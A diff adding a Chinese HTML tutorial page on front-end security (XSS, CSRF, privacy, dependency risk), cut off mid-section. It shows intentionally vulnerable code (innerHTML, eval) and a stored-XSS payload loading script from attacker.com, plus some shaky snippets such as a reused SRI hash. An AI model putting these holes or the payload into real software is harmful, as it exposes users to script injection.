@@ -1,0 +1,1548 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>前端安全与最佳实践 - 高级开发指南</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background-color: #f8f9fa;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background: linear-gradient(135deg, #ff7675 0%, #e84393 100%);
+            color: white;
+            padding: 40px 0;
+            text-align: center;
+            margin-bottom: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        
+        h2 {
+            color: #d63031;
+            margin: 30px 0 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #ff7675;
+        }
+        
+        h3 {
+            color: #e17055;
+            margin: 25px 0 15px;
+        }
+        
+        h4 {
+            color: #fdcb6e;
+            margin: 20px 0 10px;
+        }
+        
+        p {
+            margin-bottom: 16px;
+            font-size: 1.05em;
+        }
+        
+        .section {
+            background: white;
+            padding: 30px;
+            margin-bottom: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        
+        pre {
+            background-color: #1e293b;
+            color: #e2e8f0;
+            padding: 20px;
+            border-radius: 6px;
+            overflow-x: auto;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 20px 0;
+        }
+        
+        code {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #e2e8f0;
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+        
+        .demo-area {
+            background-color: #f0f9ff;
+            padding: 20px;
+            border-left: 4px solid #ff7675;
+            margin: 20px 0;
+            border-radius: 0 6px 6px 0;
+        }
+        
+        .warning-box {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 6px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .success-box {
+            background-color: #d4edda;
+            border: 1px solid #c3e6cb;
+            border-radius: 6px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .danger-box {
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            border-radius: 6px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        ul, ol {
+            margin-left: 20px;
+            margin-bottom: 16px;
+        }
+        
+        li {
+            margin-bottom: 8px;
+        }
+        
+        button {
+            background-color: #ff7675;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 5px 10px 0;
+            transition: background-color 0.3s;
+        }
+        
+        button:hover {
+            background-color: #e17055;
+        }
+        
+        .btn-secondary {
+            background-color: #fdcb6e;
+        }
+        
+        .btn-secondary:hover {
+            background-color: #e17055;
+        }
+        
+        .result {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #e6f7ff;
+            border: 1px solid #91d5ff;
+            border-radius: 4px;
+            min-height: 50px;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        
+        .highlight {
+            background-color: #fff7e6;
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        th {
+            background-color: #ff7675;
+            color: white;
+        }
+        
+        tr:hover {
+            background-color: #f5f5f5;
+        }
+        
+        .security-checklist {
+            background-color: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 6px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .checklist-item {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 15px;
+        }
+        
+        .checklist-item input[type="checkbox"] {
+            margin-top: 3px;
+            margin-right: 10px;
+        }
+        
+        .checklist-item .item-content {
+            flex: 1;
+        }
+        
+        .vulnerability-example {
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            border-radius: 6px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        
+        .secure-example {
+            background-color: #d4edda;
+            border: 1px solid #c3e6cb;
+            border-radius: 6px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        
+        .tab-container {
+            margin: 20px 0;
+        }
+        
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #dee2e6;
+            margin-bottom: 15px;
+        }
+        
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            background-color: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-bottom: none;
+            margin-right: 5px;
+            border-radius: 5px 5px 0 0;
+        }
+        
+        .tab.active {
+            background-color: #fff;
+            border-color: #dee2e6 #dee2e6 #fff;
+            font-weight: bold;
+        }
+        
+        .tab-content {
+            display: none;
+            padding: 20px;
+            border: 1px solid #dee2e6;
+            border-top: none;
+            border-radius: 0 0 5px 5px;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>前端安全与最佳实践</h1>
+            <p>构建安全、可靠、高效的前端应用</p>
+        </header>
+        
+        <div class="section">
+            <h2>1. 前端安全概述</h2>
+            <p>随着Web应用的复杂性不断增加，前端安全已成为应用开发中不可或缺的一部分。现代前端应用面临着多种安全威胁，需要开发人员采取全面的防护措施。</p>
+            
+            <h3>1.1 常见的前端安全威胁</h3>
+            <ul>
+                <li><strong>跨站脚本攻击(XSS)</strong>：注入恶意脚本到用户浏览器中执行</li>
+                <li><strong>跨站请求伪造(CSRF)</strong>：诱导用户在已认证的Web应用上执行非预期操作</li>
+                <li><strong>点击劫持(Clickjacking)</strong>：诱使用户点击伪装后的页面元素</li>
+                <li><strong>敏感数据泄露</strong>：不当处理和存储用户敏感信息</li>
+                <li><strong>依赖组件漏洞</strong>：使用存在安全漏洞的第三方库</li>
+                <li><strong>内容安全策略(CSP)绕过</strong>：绕过浏览器的安全策略限制</li>
+                <li><strong>客户端存储攻击</strong>：针对localStorage、sessionStorage的攻击</li>
+                <li><strong>中间人攻击(MITM)</strong>：在用户和服务器之间拦截通信</li>
+            </ul>
+            
+            <div class="warning-box">
+                <h4>⚠️ 安全意识提示</h4>
+                <p>前端安全不仅是后端的责任，前端开发人员同样需要积极参与安全防护。记住：<strong>永远不要信任用户输入</strong>，并且始终在客户端实施合理的安全控制，即使后端也有相应保护。</p>
+            </div>
+        </div>
+        
+        <div class="section">
+            <h2>2. XSS防护技术详解</h2>
+            
+            <h3>2.1 XSS攻击类型</h3>
+            <div class="tab-container">
+                <div class="tabs">
+                    <div class="tab active" onclick="switchTab(event, 'reflected-xss')">反射型XSS</div>
+                    <div class="tab" onclick="switchTab(event, 'stored-xss')">存储型XSS</div>
+                    <div class="tab" onclick="switchTab(event, 'dom-xss')">DOM型XSS</div>
+                </div>
+                
+                <div id="reflected-xss" class="tab-content active">
+                    <h4>反射型XSS</h4>
+                    <p>攻击脚本从URL参数直接反射回页面，通常通过诱骗用户点击特制链接触发。</p>
+                    <div class="vulnerability-example">
+                        <strong>漏洞示例：</strong>
+                        <pre>// URL: http://example.com/search?q=<script>alert('XSS')</script>
+
+// 有漏洞的代码
+function displaySearchResults() {
+    const query = new URLSearchParams(window.location.search).get('q');
+    document.getElementById('search-results').innerHTML = 
+        '搜索结果: ' + query; // 危险！直接插入HTML
+}</pre>
+                    </div>
+                </div>
+                
+                <div id="stored-xss" class="tab-content">
+                    <h4>存储型XSS</h4>
+                    <p>攻击脚本存储在目标服务器上（如数据库中），然后在用户访问页面时自动执行。</p>
+                    <div class="vulnerability-example">
+                        <strong>漏洞示例：</strong>
+                        <pre>// 用户评论中包含恶意脚本
+const comment = "看看这个有趣的脚本: <script src='http://attacker.com/malicious.js'></script>";
+
+// 有漏洞的代码
+function renderComments(comments) {
+    const commentsContainer = document.getElementById('comments');
+    comments.forEach(comment => {
+        // 危险！直接插入用户提供的HTML
+        commentsContainer.innerHTML += `
+            <div class="comment">
+                <h4>${comment.username}</h4>
+                <div class="content">${comment.content}</div>
+            </div>
+        `;
+    });
+}</pre>
+                    </div>
+                </div>
+                
+                <div id="dom-xss" class="tab-content">
+                    <h4>DOM型XSS</h4>
+                    <p>漏洞存在于客户端JavaScript代码中，攻击者通过修改页面DOM环境触发恶意代码执行。</p>
+                    <div class="vulnerability-example">
+                        <strong>漏洞示例：</strong>
+                        <pre>// 有漏洞的代码
+function navigateToPage() {
+    const page = document.getElementById('page-selector').value;
+    // 危险！直接将用户输入插入到DOM中
+    document.getElementById('page-container').innerHTML = 
+        `正在加载页面: ${page}`;
+    
+    // 或者通过eval执行用户输入
+    eval(`load${page}()`); // 极其危险！
+}</pre>
+                    </div>
+                </div>
+            </div>
+            
+            <h3>2.2 防御XSS的最佳实践</h3>
+            
+            <div class="secure-example">
+                <strong>1. 转义HTML内容</strong>
+                <pre>// 使用文本内容而非HTML内容
+function safeDisplayText(text) {
+    const element = document.createElement('div');
+    // 设置textContent而非innerHTML，自动进行HTML转义
+    element.textContent = text;
+    return element;
+}
+
+// 使用工具库如DOMPurify进行HTML清理
+import DOMPurify from 'dompurify';
+
+function displaySafeHTML(html) {
+    // 清理HTML，允许安全的标签和属性
+    const clean = DOMPurify.sanitize(html, {
+        ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong'],
+        ALLOWED_ATTR: []
+    });
+    document.getElementById('content').innerHTML = clean;
+}</pre>
+            </div>
+            
+            <div class="secure-example">
+                <strong>2. 在现代框架中使用安全的渲染方式</strong>
+                <pre>// React中的安全渲染
+function UserProfile({ user }) {
+    // React自动转义JSX中的内容，防止XSS
+    return (
+        <div className="profile">
+            <h2>{user.name}</h2>
+            <p>{user.bio}</p>
+            
+            {/* 如果需要渲染HTML，使用dangerouslySetInnerHTML并配合DOMPurify */}
+            <div 
+                dangerouslySetInnerHTML={{ 
+                    __html: DOMPurify.sanitize(user.richContent) 
+                }} 
+            />
+        </div>
+    );
+}
+
+// Vue中的安全渲染
+Vue.component('user-profile', {
+    props: ['user'],
+    template: `
+        <div class="profile">
+            <h2>{{ user.name }}</h2>
+            <p>{{ user.bio }}</p>
+            
+            <!-- 如需渲染HTML，使用v-html并确保内容安全 -->
+            <div v-html="sanitizeHTML(user.richContent)"></div>
+        </div>
+    `,
+    methods: {
+        sanitizeHTML(html) {
+            return DOMPurify.sanitize(html);
+        }
+    }
+});</pre>
+            </div>
+            
+            <div class="secure-example">
+                <strong>3. 实施内容安全策略(CSP)</strong>
+                <pre>// 在HTTP头中设置CSP
+Content-Security-Policy: 
+    default-src 'self';
+    script-src 'self' https://trusted-cdn.com;
+    style-src 'self' https://trusted-cdn.com;
+    img-src 'self' data: https://trusted-images.com;
+    connect-src 'self' https://api.trusted-api.com;
+    frame-src 'none';
+    object-src 'none';
+    base-uri 'self';
+    form-action 'self';
+
+// 或者在HTML meta标签中设置
+<meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    script-src 'self' https://trusted-cdn.com;
+    style-src 'self' https://trusted-cdn.com;
+    img-src 'self' data: https://trusted-images.com;
+    connect-src 'self' https://api.trusted-api.com;
+    frame-src 'none';
+    object-src 'none';
+    base-uri 'self';
+    form-action 'self';"></pre>
+            </div>
+            
+            <div class="secure-example">
+                <strong>4. 禁用不安全的JavaScript特性</strong>
+                <pre>// 永远不要使用这些危险的函数
+// eval() - 执行字符串作为JavaScript代码
+// new Function() - 类似eval
+// document.write() - 可能导致XSS和性能问题
+// element.innerHTML = 用户输入 - 未经清理
+
+// 安全的替代方案
+const result = JSON.parse(jsonString); // 替代eval解析JSON
+const element = document.createElement('div');
+element.textContent = userInput; // 替代innerHTML
+
+// 使用模板字符串创建DOM，而非直接操作HTML
+function createUserElement(user) {
+    const container = document.createElement('div');
+    container.className = 'user';
+    
+    const name = document.createElement('h3');
+    name.textContent = user.name;
+    
+    const email = document.createElement('p');
+    email.textContent = user.email;
+    
+    container.appendChild(name);
+    container.appendChild(email);
+    
+    return container;
+}</pre>
+            </div>
+            
+            <h3>2.3 XSS防护演示</h3>
+            <div class="demo-area">
+                <h4>输入安全测试</h4>
+                <p>尝试输入恶意脚本，观察安全过滤效果：</p>
+                <input type="text" id="xss-test-input" placeholder="输入测试内容" size="50">
+                <button onclick="testXSSProtection()">测试不安全渲染</button>
+                <button onclick="testSafeRendering()">测试安全渲染</button>
+                <div id="unsafe-result" class="result">不安全渲染结果将显示在这里...</div>
+                <div id="safe-result" class="result">安全渲染结果将显示在这里...</div>
+            </div>
+        </div>
+        
+        <div class="section">
+            <h2>3. CSRF防护与实施</h2>
+            
+            <h3>3.1 CSRF攻击原理</h3>
+            <p>跨站请求伪造(CSRF)攻击诱导已认证用户在不知情的情况下向目标站点发送恶意请求。攻击者利用用户的身份执行未授权操作。</p>
+            
+            <div class="architecture-diagram" style="background-color: #f8d7da; padding: 20px; border-radius: 6px; text-align: left; line-height: 1.8; border: 1px solid #f5c6cb;">
+                <strong>CSRF攻击流程：</strong><br>
+                1. 用户登录到受信任站点A并获取认证cookie<br>
+                2. 攻击者诱导用户访问恶意站点B<br>
+                3. 站点B自动向站点A发送请求（利用用户的cookie）<br>
+                4. 站点A接收请求，认为是已认证用户发出的合法请求<br>
+                5. 站点A执行请求，攻击者达到目的
+            </div>
+            
+            <h3>3.2 CSRF防护措施</h3>
+            
+            <div class="secure-example">
+                <strong>1. 使用CSRF令牌</strong>
+                <pre>// 后端生成CSRF令牌并发送到前端
+// 前端在表单中包含令牌
+function renderSecureForm() {
+    // 假设从后端获取的CSRF令牌
+    const csrfToken = 'csrf_token_value_from_server';
+    
+    return `
+        <form action="/api/update-profile" method="POST">
+            <input type="hidden" name="csrf_token" value="${csrfToken}">
+            <label>用户名: </label>
+            <input type="text" name="username">
+            <button type="submit">更新</button>
+        </form>
+    `;
+}
+
+// AJAX请求中添加CSRF令牌
+function updateUserProfile(data) {
+    const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+    
+    return fetch('/api/update-profile', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-CSRF-Token': csrfToken  // 在请求头中发送令牌
+        },
+        credentials: 'same-origin',  // 包含cookie
+        body: JSON.stringify(data)
+    });
+}</pre>
+            </div>
+            
+            <div class="secure-example">
+                <strong>2. 验证Referer和Origin头</strong>
+                <p>服务端应验证请求的Referer或Origin头，确保请求来自合法的来源域。</p>
+                <pre>// 前端不需要特殊处理，但了解这个机制很重要
+// 浏览器会自动设置这些头信息</pre>
+            </div>
+            
+            <div class="secure-example">
+                <strong>3. SameSite Cookie属性</strong>
+                <pre>// 在设置Cookie时使用SameSite属性
+// 服务端设置：
+// Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
+
+// 在现代浏览器中，许多默认使用SameSite=Lax
+// 前端可以要求后端确保设置正确的Cookie属性</pre>
+            </div>
+            
+            <div class="secure-example">
+                <strong>4. 实施双因素认证</strong>
+                <pre>// 敏感操作要求额外验证
+function confirmSensitiveAction() {
+    const confirmCode = prompt('请输入验证码以确认此操作：');
+    
+    if (confirmCode) {
+        return fetch('/api/confirm-action', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                action: 'delete_account',
+                confirmation_code: confirmCode
+            })
+        });
+    }
+    
+    return Promise.reject('用户取消操作');
+}</pre>
+            </div>
+        </div>
+        
+        <div class="section">
+            <h2>4. 数据安全与隐私保护</h2>
+            
+            <h3>4.1 敏感数据处理最佳实践</h3>
+            
+            <div class="warning-box">
+                <h4>敏感数据清单</h4>
+                <ul>
+                    <li>个人身份信息(PII)：姓名、身份证号、地址、电话号码等</li>
+                    <li>财务信息：信用卡号、银行账号、支付详情等</li>
+                    <li>认证凭证：密码、令牌、密钥等</li>
+                    <li>健康信息</li>
+                    <li>位置信息</li>
+                    <li>用户行为数据</li>
+                </ul>
+            </div>
+            
+            <div class="secure-example">
+                <strong>1. 安全存储敏感数据</strong>
+                <pre>// 永远不要在客户端存储敏感数据
+// 不要做这些：
+localStorage.setItem('password', userPassword); // 危险！
+localStorage.setItem('creditCard', cardNumber); // 危险！
+
+// 可以安全存储的：
+localStorage.setItem('preferences', JSON.stringify(userPreferences));
+localStorage.setItem('theme', 'dark');
+sessionStorage.setItem('tempFormData', JSON.stringify(formData));
+
+// 安全地存储令牌（但最好使用HttpOnly Cookie）
+// 仅在必要时使用，且设置合理的过期时间
+function storeAuthToken(token) {
+    try {
+        sessionStorage.setItem('auth_token', token);
+        
+        // 设置自动过期
+        setTimeout(() => {
+            sessionStorage.removeItem('auth_token');
+            alert('会话已过期，请重新登录');
+            window.location.href = '/login';
+        }, 3600000); // 1小时后过期
+    } catch (e) {
+        console.error('存储令牌失败', e);
+    }
+}
+
+// 安全获取令牌
+function getAuthToken() {
+    return sessionStorage.getItem('auth_token');
+}
+
+// 使用后清除令牌
+function logout() {
+    sessionStorage.removeItem('auth_token');
+    // 其他清理工作...
+}</pre>
+            </div>
+            
+            <div class="secure-example">
+                <strong>2. 传输层安全(HTTPS)</strong>
+                <pre>// 确保所有API请求使用HTTPS
+function apiRequest(endpoint, options = {}) {
+    // 强制使用HTTPS
+    const baseUrl = 'https://api.yourdomain.com';
+    
+    // 添加安全头
+    const headers = {
+        'Content-Type': 'application/json',
+        ...options.headers
+    };
+    
+    // 包含认证信息
+    if (getAuthToken()) {
+        headers['Authorization'] = `Bearer ${getAuthToken()}`;
+    }
+    
+    return fetch(`${baseUrl}${endpoint}`, {
+        ...options,
+        headers,
+        credentials: 'same-origin' // 确保发送cookie
+    }).then(response => {
+        // 验证响应安全
+        if (!response.ok) {
+            throw new Error(`API错误: ${response.status}`);
+        }
+        return response.json();
+    });
+}
+
+// 检测页面是否使用HTTPS
+function ensureHttps() {
+    if (window.location.protocol !== 'https:') {
+        // 重定向到HTTPS版本
+        window.location.href = 'https:' + window.location.href.substring(window.location.protocol.length);
+    }
+}</pre>
+            </div>
+            
+            <h3>4.2 隐私保护与合规</h3>
+            
+            <div class="warning-box">
+                <h4>主要隐私法规</h4>
+                <ul>
+                    <li><strong>GDPR</strong>（欧盟）：通用数据保护条例</li>
+                    <li><strong>CCPA/CPRA</strong>（加州）：加州消费者隐私法案</li>
+                    <li><strong>PIPL</strong>（中国）：个人信息保护法</li>
+                    <li><strong>LGPD</strong>（巴西）：通用数据保护法</li>
+                </ul>
+            </div>
+            
+            <div class="secure-example">
+                <strong>1. 实现Cookie同意管理</strong>
+                <pre>// Cookie同意管理示例
+class CookieConsentManager {
+    constructor() {
+        this.consentKey = 'cookie_consent';
+        this.categories = {
+            essential: true, // 必要的Cookie默认启用
+            analytics: false,
+            marketing: false,
+            personalization: false
+        };
+        this.consentData = this.loadConsent();
+    }
+    
+    loadConsent() {
+        try {
+            const stored = localStorage.getItem(this.consentKey);
+            return stored ? JSON.parse(stored) : this.categories;
+        } catch (e) {
+            console.error('加载Cookie同意设置失败', e);
+            return this.categories;
+        }
+    }
+    
+    saveConsent(consent) {
+        try {
+            this.consentData = { ...this.categories, ...consent };
+            localStorage.setItem(this.consentKey, JSON.stringify(this.consentData));
+            this.applyConsent();
+            return true;
+        } catch (e) {
+            console.error('保存Cookie同意设置失败', e);
+            return false;
+        }
+    }
+    
+    applyConsent() {
+        // 应用同意设置到第三方服务
+        if (this.consentData.analytics) {
+            this.loadAnalytics();
+        }
+        
+        if (this.consentData.marketing) {
+            this.loadMarketingScripts();
+        }
+        
+        // 记录同意时间和版本
+        this.recordConsent();
+    }
+    
+    loadAnalytics() {
+        // 加载分析脚本
+        const script = document.createElement('script');
+        script.src = 'https://analytics-provider.com/script.js';
+        script.async = true;
+        document.head.appendChild(script);
+    }
+    
+    showConsentBanner() {
+        // 如果没有保存的同意或版本已更新，则显示横幅
+        if (!this.consentData.timestamp || this.consentData.version !== '1.0') {
+            this.renderConsentBanner();
+        }
+    }
+    
+    renderConsentBanner() {
+        // 创建Cookie同意横幅UI
+        const banner = document.createElement('div');
+        banner.className = 'cookie-banner';
+        banner.innerHTML = `
+            <div class="content">
+                <p>我们使用Cookie来提升您的体验。了解更多，请查看我们的<a href="/privacy-policy">隐私政策</a>。</p>
+                <div class="actions">
+                    <button id="accept-essential">仅必要Cookie</button>
+                    <button id="accept-all">接受所有</button>
+                    <button id="customize-cookies">自定义</button>
+                </div>
+            </div>
+        `;
+        document.body.appendChild(banner);
+        
+        // 添加事件监听器
+        document.getElementById('accept-essential').addEventListener('click', () => {
+            this.saveConsent({ essential: true });
+            banner.remove();
+        });
+        
+        document.getElementById('accept-all').addEventListener('click', () => {
+            this.saveConsent({ essential: true, analytics: true, marketing: true, personalization: true });
+            banner.remove();
+        });
+        
+        document.getElementById('customize-cookies').addEventListener('click', () => {
+            this.showConsentSettings();
+        });
+    }
+    
+    showConsentSettings() {
+        // 显示详细设置对话框
+        // ...
+    }
+}
+
+// 使用Cookie同意管理器
+const cookieManager = new CookieConsentManager();
+cookieManager.showConsentBanner();</pre>
+            </div>
+            
+            <div class="secure-example">
+                <strong>2. 匿名化和假名化数据处理</strong>
+                <pre>// 数据匿名化处理
+function anonymizeUserData(userData) {
+    return {
+        // 移除直接标识符
+        userId: hashId(userData.id), // 使用哈希替代真实ID
+        ageGroup: getAgeGroup(userData.birthdate), // 使用年龄组替代出生日期
+        country: userData.country, // 可以保留非敏感的聚合信息
+        // 移除具体地址，只保留城市
+        location: userData.address?.city || '未知',
+        // 移除电话号码、邮箱等直接标识符
+        // ...
+    };
+}
+
+// 简单的ID哈希函数（实际应用中应使用更强的哈希算法）
+function hashId(id) {
+    // 实际生产环境中应使用像SHA-256这样的强哈希算法
+    let hash = 0;
+    for (let i = 0; i < id.length; i++) {
+        hash = ((hash << 5) - hash) + id.charCodeAt(i);
+        hash |= 0; // 转换为32位整数
+    }
+    return Math.abs(hash).toString(16);
+}
+
+// 按年龄段分类
+function getAgeGroup(birthdate) {
+    const today = new Date();
+    const birthDate = new Date(birthdate);
+    let age = today.getFullYear() - birthDate.getFullYear();
+    const monthDiff = today.getMonth() - birthDate.getMonth();
+    
+    if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
+        age--;
+    }
+    
+    if (age < 18) return '13-17';
+    if (age < 25) return '18-24';
+    if (age < 35) return '25-34';
+    if (age < 45) return '35-44';
+    if (age < 55) return '45-54';
+    return '55+';
+}
+
+// 安全的数据收集
+function collectUsageAnalytics(event) {
+    if (cookieManager.consentData.analytics) {
+        const anonymousData = {
+            eventType: event.type,
+            timestamp: new Date().toISOString(),
+            pagePath: window.location.pathname,
+            // 使用匿名会话ID而非用户ID
+            sessionId: getAnonymousSessionId(),
+            // 屏幕尺寸等环境信息可以收集
+            screenSize: `${window.innerWidth}x${window.innerHeight}`,
+            // 避免收集个人可识别信息
+        };
+        
+        // 发送到分析服务器
+        sendAnalytics(anonymousData);
+    }
+}
+
+// 生成匿名会话ID
+function getAnonymousSessionId() {
+    let sessionId = sessionStorage.getItem('anonymous_session_id');
+    if (!sessionId) {
+        // 生成随机会话ID
+        sessionId = 'session_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+        sessionStorage.setItem('anonymous_session_id', sessionId);
+    }
+    return sessionId;
+}</pre>
+            </div>
+        </div>
+        
+        <div class="section">
+            <h2>5. 依赖安全与供应链风险</h2>
+            
+            <h3>5.1 依赖管理最佳实践</h3>
+            
+            <div class="warning-box">
+                <h4>依赖安全风险</h4>
+                <ul>
+                    <li><strong>已知漏洞</strong>：使用含有已知安全漏洞的依赖</li>
+                    <li><strong>恶意代码</strong>：依赖中包含恶意代码（如eslint-scope事件）</li>
+                    <li><strong>废弃维护</strong>：使用不再维护的库</li>
+                    <li><strong>传递依赖</strong>：间接依赖中的安全问题</li>
+                </ul>
+            </div>
+            
+            <div class="secure-example">
+                <strong>1. 依赖审计自动化</strong>
+                <pre>// 在package.json中添加安全脚本
+{
+  "scripts": {
+    "audit": "npm audit",
+    "audit:fix": "npm audit fix --force",
+    "preinstall": "npx npm-force-resolutions", // 强制依赖版本
+    "postinstall": "npm audit --production"  // 安装后自动审计
+  },
+  "resolutions": {
+    "lodash": "^4.17.21", // 强制特定版本以修复漏洞
+    "serialize-javascript": "^3.1.0"
+  }
+}
+
+// 自动化依赖扫描配置 (.github/workflows/security-audit.yml)
+/*
+name: Security Audit
+on:
+  schedule:
+    - cron: '0 0 * * 0' # 每周日运行
+  push:
+    branches: [ main, develop ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      - name: Setup Node.js
+        uses: actions/setup-node@v2
+        with:
+          node-version: '16'
+      - name: Install dependencies
+        run: npm ci
+      - name: Run npm audit
+        run: npm audit --audit-level=high
+      - name: Run Snyk to check for vulnerabilities
+        uses: snyk/actions/node@master
+        env:
+          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+*/</pre>
+            </div>
+            
+            <div class="secure-example">
+                <strong>2. 依赖锁定和版本控制</strong>
+                <pre>// 确保使用package-lock.json或yarn.lock
+// 在CI/CD中使用npm ci而非npm install
+// CI/CD脚本示例
+/*
+npm ci --production  # 使用package-lock.json安装精确版本
+*/
+
+// 依赖版本策略
+// 避免使用宽泛的版本范围
+{
+  "dependencies": {
+    // 不推荐
+    "react": "^16.0.0", // 可能自动升级到含有新漏洞的版本
+    
+    // 推荐
+    "react": "16.14.0", // 精确版本
+    "lodash": "^4.17.21" // 只升级补丁版本，相对安全
+  }
+}
+
+// 使用依赖检查工具
+// 在.gitlab-ci.yml或GitHub Actions中集成
+/*
+dependency_scanning:
+  stage: test
+  script:
+    - npm install -g npm-check-updates
+    - npx npm-check-updates --doctor  # 检查依赖健康状况
+    - npx depcheck  # 检查未使用的依赖
+*/</pre>
+            </div>
+            
+            <h3>5.2 第三方脚本安全管理</h3>
+            
+            <div class="secure-example">
+                <strong>1. 子资源完整性(SRI)检查</strong>
+                <pre>// 使用SRI确保第三方脚本未被篡改
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK"
+        crossorigin="anonymous"></script>
+
+// 如何生成SRI哈希值
+// 1. 使用在线工具：https://www.srihash.org/
+// 2. 使用命令行：
+/*
+cat jquery-3.6.0.min.js | openssl dgst -sha384 -binary | openssl base64 -A
+*/
+
+// 动态脚本加载时也应验证SRI
+async function loadScriptWithIntegrity(url, integrity) {
+    const response = await fetch(url);
+    const scriptContent = await response.text();
+    
+    // 计算脚本内容的哈希值
+    const hashBuffer = await crypto.subtle.digest('SHA-384', new TextEncoder().encode(scriptContent));
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    const hashBase64 = btoa(hashArray.map(b => String.fromCharCode(b)).join(''));
+    const computedIntegrity = `sha384-${hashBase64}`;
+    
+    // 验证哈希值
+    if (computedIntegrity !== integrity) {
+        throw new Error('脚本完整性验证失败');
+    }
+    
+    // 动态创建脚本元素
+    const script = document.createElement('script');
+    script.text = scriptContent;
+    document.head.appendChild(script);
+    
+    return script;
+}
+
+// 使用示例
+loadScriptWithIntegrity(
+    'https://analytics-provider.com/script.js',
+    'sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK'
+).catch(error => {
+    console.error('安全加载脚本失败:', error);
+});</pre>
+            </div>
+            
+            <div class="secure-example">
+                <strong>2. 第三方脚本隔离</strong>
+                <pre>// 使用内容安全策略限制脚本来源
+// Content-Security-Policy头示例
+/*
+Content-Security-Policy: 
+    default-src 'self';
+    script-src 'self' https://trusted-cdn.com https://analytics.trusted.com;
+    style-src 'self' https://trusted-cdn.com;
+    frame-src https://trusted-frame.com;
+*/
+
+// 使用sandbox iframe加载第三方内容
+function loadThirdPartyContent(url, height = '300px') {
+    const container = document.createElement('div');
+    
+    const iframe = document.createElement('iframe');
+    iframe.src = url;
+    iframe.width = '100%';
+    iframe.height = height;
+    iframe.sandbox = 'allow-scripts'; // 只允许执行脚本，不允许其他权限
+    iframe.loading = 'lazy';
+    iframe.referrerPolicy = 'strict-origin-when-cross-origin';
+    
+    container.appendChild(iframe);
+    return container;
+}
+
+// 延迟加载非关键第三方脚本
+function deferNonCriticalScripts() {
+    // 页面加载完成后再加载
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', loadDeferredScripts);
+    } else {
+        loadDeferredScripts();
+    }
+}
+
+function loadDeferredScripts() {
+    // 加载分析脚本
+    const analyticsScript = document.createElement('script');
+    analyticsScript.src = 'https://analytics-provider.com/analytics.js';
+    analyticsScript.async = true;
+    analyticsScript.defer = true;
+    document.body.appendChild(analyticsScript);
+    
+    // 加载广告脚本
+    const adsScript = document.createElement('script');
+    adsScript.src = 'https://ads-provider.com/ads.js';
+    adsScript.async = true;
+    adsScript.defer = true;
+    document.body.appendChild(adsScript);
+}
+
+deferNonCriticalScripts();</pre>
+            </div>
+        </div>
+        
+        <div class="section">
+            <h2>6. 前端安全测试与监控</h2>
+            
+            <h3>6.1 自动化安全测试集成</h3>
+            
+            <div class="secure-example">
+                <strong>1. 静态应用安全测试(SAST)</strong>
+                <pre>// 在package.json中添加安全测试脚本
+{
+  "scripts": {
+    "security:check": "npm audit && eslint . --ext .js,.jsx,.ts,.tsx --config .eslintrc.security.json",
